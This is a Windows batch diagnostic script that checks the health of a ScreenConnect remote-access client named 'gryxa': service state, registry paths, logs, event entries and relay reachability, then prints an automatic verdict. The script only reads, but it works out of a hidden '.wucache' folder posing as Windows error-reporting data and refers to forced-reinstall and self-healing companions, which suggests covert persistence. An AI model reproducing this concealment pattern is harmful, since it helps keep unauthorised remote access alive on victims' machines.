@echo off
rem GRYXA_DIAG BUILD 20260804D2 - connect-drop dump + automatic VERDICT from logs
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "OUT=%WD%\gryxa_diag.txt"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "SVC=ScreenConnect Client (%FP%)"
set "STAGE=%SystemRoot%\Temp\.upd"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
> "%OUT%" echo ===== GRYXA DIAG %DATE% %TIME% host=%COMPUTERNAME% =====

>>"%OUT%" echo.
>>"%OUT%" echo --- builds ---
findstr /C:"MONVER=" /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.ps1" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA_FORCE BUILD" "%WD%\own_gryxa_force.cmd" >>"%OUT%" 2>nul
if exist "%WD%\fleet_channel.cfg" (>>"%OUT%" echo channel: & type "%WD%\fleet_channel.cfg" >>"%OUT%")
if exist "%WD%\version_floor.cfg" (>>"%OUT%" echo floor: & type "%WD%\version_floor.cfg" >>"%OUT%")
if exist "%WD%\observe.flag" (>>"%OUT%" echo OBSERVE=ON) else (>>"%OUT%" echo OBSERVE=off)

>>"%OUT%" echo.
>>"%OUT%" echo --- all ScreenConnect services ---
sc query state= all | findstr /C:"ScreenConnect Client" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- gryxa svc detail ---
sc query "%SVC%" >>"%OUT%" 2>&1
sc qc "%SVC%" >>"%OUT%" 2>&1

>>"%OUT%" echo.
>>"%OUT%" echo --- ImagePath all SC ---
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  >>"%OUT%" echo FP=!_FP!
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath >>"%OUT%" 2>&1
)

>>"%OUT%" echo.
>>"%OUT%" echo --- dirs ---
dir /b "%ProgramFiles(x86)%\ScreenConnect Client*" >>"%OUT%" 2>nul
dir /b "%ProgramFiles%\ScreenConnect Client*" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- processes ---
tasklist /FI "IMAGENAME eq ScreenConnect.ClientService.exe" >>"%OUT%" 2>nul
tasklist /FI "IMAGENAME eq ScreenConnect.WindowsClient.exe" >>"%OUT%" 2>nul
tasklist /FI "IMAGENAME eq msiexec.exe" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- locks / results / flags ---
if exist "%WD%\gryxa_msi.lock" (>>"%OUT%" echo LOCK=present) else (>>"%OUT%" echo LOCK=absent)
if exist "%WD%\gryxa_heal.flag" (>>"%OUT%" echo HEAL_FLAG= & type "%WD%\gryxa_heal.flag" >>"%OUT%") else (>>"%OUT%" echo HEAL_FLAG=absent)
if exist "%WD%\force_gryxa.new" (>>"%OUT%" echo FORCE_NEW= & type "%WD%\force_gryxa.new" >>"%OUT%") else (>>"%OUT%" echo FORCE_NEW=absent)
if exist "%WD%\force_gryxa.done" (>>"%OUT%" echo FORCE_DONE= & type "%WD%\force_gryxa.done" >>"%OUT%") else (>>"%OUT%" echo FORCE_DONE=absent)
if exist "%WD%\gryxa.cfg" (>>"%OUT%" echo CFG= & type "%WD%\gryxa.cfg" >>"%OUT%") else (>>"%OUT%" echo CFG=absent)

>>"%OUT%" echo.
>>"%OUT%" echo --- mon log tail ---
if exist "%WD%\own_mon.log" powershell -NoP -C "Get-Content -LiteralPath '%WD%\own_mon.log' -Tail 60" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- own_gryxa.log tail ---
if exist "%WD%\own_gryxa.log" powershell -NoP -C "Get-Content -LiteralPath '%WD%\own_gryxa.log' -Tail 50" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- App log MsiInstaller/ScreenConnect 30m ---
powershell -NoP -C "$s=(Get-Date).AddMinutes(-30); Get-WinEvent -FilterHashtable @{LogName='Application'; StartTime=$s} -EA 0 | ?{ $_.ProviderName -match 'ScreenConnect|MsiInstaller' -or $_.Message -match 'ScreenConnect|36e506ff|9D7CC418' } | Select-Object -First 30 TimeCreated,ProviderName,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(200,$_.Message.Length))}} | Format-List" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- System SCM ScreenConnect 30m ---
powershell -NoP -C "$s=(Get-Date).AddMinutes(-30); Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='Service Control Manager'; StartTime=$s} -EA 0 | ?{ $_.Message -match 'ScreenConnect' } | Select-Object -First 20 TimeCreated,Id,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(200,$_.Message.Length))}} | Format-List" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- TCP relay/ui ---
powershell -NoP -C "foreach($h in @('update.gryxa.com','ui.gryxa.com')){ try{ $r=Test-NetConnection $h -Port 443 -WarningAction SilentlyContinue; \"$h tcp443=$($r.TcpTestSucceeded)\" } catch { \"$h ERR\" } }" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- AUTO VERDICT ---
set "V=UNKNOWN"
findstr /I /C:"msiexec /x" /C:"preclean_gryxa" /C:"ProductCode" "%WD%\own_gryxa.log" >nul 2>&1 && set "V=OUR_GRYXA_UNINSTALL"
findstr /I /C:"gryxa_force_push" /C:"REINSTALL" /C:"force_push" "%WD%\own_mon.log" >nul 2>&1 && set "V=OUR_FORCE_REINSTALL"
findstr /I /C:"gryxa_heal_queued" /C:"gryxa_1060_queue_heal" "%WD%\own_mon.log" >nul 2>&1 && set "V=OUR_HEAL_QUEUED"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  if /I "!V!"=="UNKNOWN" set "V=SERVICE_MISSING_1060"
) else (
  sc query "%SVC%" | findstr /I RUNNING >nul
  if errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      if /I "!V!"=="UNKNOWN" set "V=STOPPED_BUT_RELAY_OK_NOT_REINSTALL"
    ) else (
      if /I "!V!"=="UNKNOWN" set "V=STOPPED_NO_RELAY"
    )
  ) else (
    set "V=CURRENTLY_RUNNING"
  )
)
>>"%OUT%" echo VERDICT=!V!
>>"%OUT%" echo.
>>"%OUT%" echo Decode:
>>"%OUT%" echo   OUR_*              = our mon/gryxa did something - check timestamps vs drop
>>"%OUT%" echo   STOPPED_BUT_RELAY_OK = service flapped; start-only; NOT msiexec
>>"%OUT%" echo   SERVICE_MISSING_1060 = uninstalled or deleted; check MsiInstaller events
>>"%OUT%" echo   CURRENTLY_RUNNING  = up now; drop may be panel/relay-side
>>"%OUT%" echo.
>>"%OUT%" echo ===== END DIAG =====

echo WROTE %OUT%
echo VERDICT=!V!
echo --- preview ---
powershell -NoP -C "Get-Content -LiteralPath '%OUT%' -TotalCount 100"
endlocal
